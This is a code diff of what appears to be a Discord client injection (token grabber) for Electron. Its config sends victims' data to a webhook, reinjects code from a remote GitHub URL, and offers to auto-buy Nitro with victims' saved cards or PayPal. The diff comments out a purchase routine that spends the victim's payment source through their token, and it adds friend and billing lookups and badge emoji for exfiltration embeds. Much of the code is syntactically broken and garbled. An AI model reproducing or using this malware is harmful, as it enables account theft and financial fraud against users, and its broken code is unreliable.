@@ -8,7 +8,6 @@ const { BrowserWindow, session } = require('electron');
 const config = {
   webhook: '%WEBHOOK%',
   ip: '%IP%',
-  webhook_protector_key: '%WEBHOOK_KEY%', //your base32 encoded key IF you're using https://github.com/Rdimo/Discord-Webhook-Protector
   auto_buy_nitro: true, //automatically buys nitro for you if they add credit card or paypal or tries to buy nitro themselves
   ping_on_run: false, //sends whatever value you have in ping_val when you get a run/login
   ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
@@ -16,31 +15,8 @@ const config = {
   embed_icon: 'https://cdn.discordapp.com/attachments/985660218253934622/985676305104265226/nemotitre.jpg'.replace(/ /g, '%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
   embed_color: 1746924, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
   injection_url: 'https://raw.githubusercontent.com/oxyidz/mezff/main/index.js', //injection url for when it reinjects
-  /**
-   * @ATTENTION DON'T TOUCH UNDER HERE IF UNLESS YOU'RE MODIFYING THE INJECTION OR KNOW WHAT YOU'RE DOING @ATTENTION
-   **/
   api: 'https://discord.com/api/v9/users/@me',
-  nitro: {
-    boost: {
-      year: {
-        id: '521847234246082599',
-        sku: '511651885459963904',
-        price: '9999',
-      },
-      month: {
-        id: '521847234246082599',
-        sku: '511651880837840896',
-        price: '999',
-      },
-    },
-    classic: {
-      month: {
-        id: '521846918637420545',
-        sku: '511651871736201216',
-        price: '499',
-      },
-    },
-  },
+  
   filter: {
     urls: [
       'https://discord.com/api/v*/users/@me',
@@ -514,7 +490,7 @@ const getBilling = async (token) => {
 
 const fetchFriends = async = (token) => {
   const bill = await execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("GET", "https://discord.com/api/v6/users/@me/relationships3, false);
+    xmlHttp.open("GET", "${config.api}/relationships, false);
     xmlHttp.setRequestHeader("Authorization", "${token}");
     xmlHttp.send(null);
     xmlHttp.responseText`);
@@ -523,79 +499,88 @@ const fetchFriends = async = (token) => {
 };
 
 const getFriends = async (token) => {
-  let s = 0;
+//   let s = 0;
   const data = await fetchFriends(token);
-  data.forEach(x) => {
-    if (x['type'] ==1) {
-      s+=1;
-    }
-  });
-  return s;
-};
+//   data.forEach(x) => {
+//     if (x['type'] ==1) {
+//       s+=1;
+//     }
+//   });
+//   return s;
+// };
 
-const Purchase = async (token, id, _type, _time) => {
-  const options = {
-    expected_amount: config.nitro[_type][_time]['price'],
-    expected_currency: 'usd',
-    gift: true,
-    payment_source_id: id,
-    payment_source_token: null,
-    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
-    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
-  };
+// const Purchase = async (token, id, _type, _time) => {
+//   const options = {
+//     expected_amount: config.nitro[_type][_time]['price'],
+//     expected_currency: 'usd',
+//     gift: true,
+//     payment_source_id: id,
+//     payment_source_token: null,
+//     purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
+//     sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
+//   };
 
-  const req = execScript(`var xmlHttp = new XMLHttpRequest();
-    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
-    xmlHttp.setRequestHeader("Authorization", "${token}");
-    xmlHttp.setRequestHeader('Content-Type', 'application/json');
-    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
-    xmlHttp.responseText`);
-  if (req['gift_code']) {
-    return 'https://discord.gift/' + req['gift_code'];
-  } else return null;
-};
+//   const req = execScript(`var xmlHttp = new XMLHttpRequest();
+//     xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
+//     xmlHttp.setRequestHeader("Authorization", "${token}");
+//     xmlHttp.setRequestHeader('Content-Type', 'application/json');
+//     xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
+//     xmlHttp.responseText`);
+//   if (req['gift_code']) {
+//     return 'https://discord.gift/' + req['gift_code'];
+//   } else return null;
+// };
 
-const buyNitro = async (token) => {
-  const data = await fetchBilling(token);
-  const failedMsg = 'Failed to Purchase ❌';
-  if (!data) return failedMsg;
+// const buyNitro = async (token) => {
+//   const data = await fetchBilling(token);
+//   const failedMsg = 'Failed to Purchase ❌';
+//   if (!data) return failedMsg;
 
-  let IDS = [];
+//   let IDS = [];
+  let s = 0;
+  let k = 0;
   data.forEach((x) => {
     if (!x.invalid) {
-      IDS = IDS.concat(x.id);
-    }
-  });
-  for (let sourceID in IDS) {
-    const first = Purchase(token, sourceID, 'boost', 'year');
-    if (first !== null) {
-      return first;
-    } else {
-      const second = Purchase(token, sourceID, 'boost', 'month');
-      if (second !== null) {
-        return second;
-      } else {
-        const third = Purchase(token, sourceID, 'classic', 'month');
-        if (third !== null) {
-          return third;
-        } else {
-          return failedMsg;
-        }
+//       IDS = IDS.concat(x.id);
+//     }
+//   });
+//   for (let sourceID in IDS) {
+//     const first = Purchase(token, sourceID, 'boost', 'year');
+//     if (first !== null) {
+//       return first;
+//     } else {
+//       const second = Purchase(token, sourceID, 'boost', 'month');
+//       if (second !== null) {
+//         return second;
+//       } else {
+//         const third = Purchase(token, sourceID, 'classic', 'month');
+//         if (third !== null) {
+//           return third;
+//         } else {
+//           return failedMsg;
+//         }
+      switch (x.type) {
+        case 1:
+          s += 1;
+        case 2:
+          k += 1;
       }
     }
-  }
+//   }
 };
+return s;
+ };
 
 const getNitro = (flags) => {
   switch (flags) {
     case 0:
-      return 'No Nitro';
+      return '';
     case 1:
-      return 'Nitro Classic';
+      return '<:4872badgenitroclassic:985676613079400488> ';
     case 2:
-      return 'Nitro Boost';
+      return '<:4872badgenitroclassic:985676613079400488> ';
     default:
-      return 'No Nitro';
+      return '';
   }
 };
 
@@ -603,34 +588,34 @@ const getBadges = (flags) => {
   let badges = '';
   switch (flags) {
     case 1:
-      badges += 'Discord Staff, ';
+      badges += ' <:6832badgediscordstaff:985676806294233140> ';
       break;
     case 2:
-      badges += 'Partnered Server Owner, ';
+      badges += ' <:7606badgepartneredserverowner:985676965086375976> ';
       break;
     case 131072:
-      badges += 'Verified Bot Developer, ';
+      badges += ' <:1564badgedeveloper:985677107399118900> ';
       break;
     case 4:
-      badges += 'Hypesquad Event, ';
+      badges += ' <:7606badgehypesquadevents:985677218707554375> ';
       break;
     case 16384:
-      badges += 'Gold BugHunter, ';
+      badges += ' <:7904discordbughunterlv2:985677598619209729> ';
       break;
     case 8:
-      badges += 'Green BugHunter, ';
+      badges += ' <:9595badgebughunter:985677427487436861> ';
       break;
     case 512:
-      badges += 'Early Supporter, ';
+      badges += ' <:6832badgeearlysupporter:985677713719324692> ';
       break;
     case 128:
-      badges += 'HypeSquad Brillance, ';
+      badges += '<:1350discordbrillance:985677830325170266> ';
       break;
     case 64:
-      badges += 'HypeSquad Bravery, ';
+      badges += ' <:1247discordbravery:985677969861259285> ';
       break;
     case 256:
-      badges += 'HypeSquad Balance, ';
+      badges += ' <:5946discordbalance:985678482619113522> ';
       break;
     case 0:
       badges = 'No Badges';
